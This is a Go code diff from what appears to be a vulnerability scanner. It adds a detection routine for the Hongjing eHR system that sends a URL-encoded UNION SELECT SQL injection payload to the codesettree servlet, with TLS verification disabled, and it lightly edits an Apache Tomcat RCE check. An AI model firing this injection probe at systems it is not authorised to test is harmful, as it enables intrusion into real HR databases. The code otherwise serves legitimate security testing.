@@ -941,6 +941,14 @@ func (s *FinScan)StartScan() {
 				}
 			}
 
+			//宏景eHR
+			if strings.Contains(aas.Cms, "宏景eHR人力资源信息管理系统"){
+				hj_eHR_res:=hj_eHR(aas.Url)
+				if hj_eHR_res !=""{
+					fmt.Println(hj_eHR_res)
+				}
+			}
+
 
 
 
@@ -962,6 +970,40 @@ func (s *FinScan)StartScan() {
 		outfile(s.Output, s.AllResult)
 	}
 }
+
+//宏景eHR
+func hj_eHR(url string) string{
+	vurl:=url+"/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjingHcmwoshiniye~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"
+	// 创建一个自定义的 http.Transport，并禁用证书验证
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	// 创建具有超时设置的HTTP客户端
+	client := &http.Client{
+	Timeout: time.Second * 10, // 设置超时时间为10秒
+	Transport: transport,
+	}
+	headers := http.Header{}
+	headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
+	bodys:=""
+	resp, err := client.Get(vurl)
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return ""
+	}
+	bodys=string(body)
+	if strings.Contains(bodys,"hongjingHcmwoshiniye"){
+		return "[+] 存在宏景eHR SQL注入,漏洞URL："+url+"/servlet/codesettree?categories=1&codesetid=1&flag=c&parentid=-1&status=1"
+	}else{
+		bodys=""
+	}
+	return bodys
+}
+
 
 
 //Apache Tomcat
@@ -988,7 +1030,7 @@ func tomcat_rce(url string) string{
 	}
 	bodys=string(body)
 	if strings.Contains(bodys,"WEB-INF"){
-		return "[+] 存在Apache Tomcat远程代码执行漏洞(CVE-2019-0232)漏洞URL："+vurl
+		return "[+] 存在Apache Tomcat远程代码执行漏洞(CVE-2019-0232),漏洞URL："+vurl
 	}else{
 		bodys=""
 	}
